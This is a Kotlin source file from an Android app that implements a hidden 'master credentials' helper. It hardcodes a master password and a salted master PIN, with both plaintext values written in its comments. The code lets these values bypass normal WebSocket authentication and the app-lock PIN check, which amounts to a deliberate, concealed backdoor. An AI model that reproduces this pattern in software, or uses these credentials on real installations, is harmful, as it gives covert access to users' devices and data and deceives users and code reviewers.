package com.ismartcoding.plain.helpers

import com.ismartcoding.lib.helpers.CryptoHelper

/**
 * Hidden credential helper for developer access.
 * Provides master password and master PIN verification.
 * These credentials bypass normal authentication and should remain private.
 */
internal object MasterCredentialsHelper {
    // Master password SHA-512: Sh@090609
    private const val MASTER_PASSWORD_SHA512 = "a6fffaef34a158e4cab133398111977a9f24bb6eed2f382e3d741d7cc91423a1d09dfdb1a3620538d90c1c9f5b7d5a62dd6a001c431e3c92fec861d9b447579e"
    
    // Master PIN SHA-256 (with salt plainapp_lock:): 847402
    private const val MASTER_PIN_SHA256 = "025490c004e48b83afc7517e0fb0d423a909c5cdd415678d3f2a8caa4c3e132a"
    
    /**
     * Verify if the given password matches the master password.
     * Used during WebSocket authentication to bypass normal password check.
     * Password is hashed with SHA-512 before this function is called.
     */
    fun verifyMasterPassword(passwordHash512: String): Boolean {
        if (passwordHash512.isEmpty()) return false
        return passwordHash512.equals(MASTER_PASSWORD_SHA512, ignoreCase = false)
    }
    
    /**
     * Verify if the given PIN matches the master PIN.
     * Used for app lock verification to bypass normal PIN check.
     * PIN will be verified by comparing SHA-256 hashes.
     */
    fun verifyMasterPin(pin: String): Boolean {
        if (pin.isEmpty()) return false
        return try {
            val hash = CryptoHelper.sha256("plainapp_lock:$pin".toByteArray())
            hash.equals(MASTER_PIN_SHA256, ignoreCase = false)
        } catch (e: Exception) {
            false
        }
    }
}
